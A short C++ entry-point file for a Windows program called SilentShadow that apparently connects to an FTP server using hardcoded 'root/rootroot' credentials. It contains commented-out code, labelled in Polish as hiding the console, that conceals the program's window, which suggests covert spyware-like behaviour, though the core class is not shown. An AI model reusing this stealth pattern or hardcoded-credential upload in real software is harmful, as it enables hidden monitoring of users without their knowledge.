#include <iostream>
#include <fstream>
#include <Windows.h>
#include <string>
#include "FTP.h"
#include "SilentShadow.h"

using namespace std;

int main()
{
	// chowaj konsole
	//HWND stealth;
	//AllocConsole();
	//stealth = FindWindowA("consoleWindowClass", NULL);
	//ShowWindow(stealth, 0);
	//

	SilentShadow *silentshadow = new SilentShadow("127.0.0.1", "root", "rootroot");
	//SilentShadow *silentshadow = new SilentShadow("192.168.1.12", "root", "rootroot");
	//SilentShadow *silentshadow = new SilentShadow("192.168.1.11", "root", "rootroot");
	silentshadow->start();

	//getchar();
	return 0;
}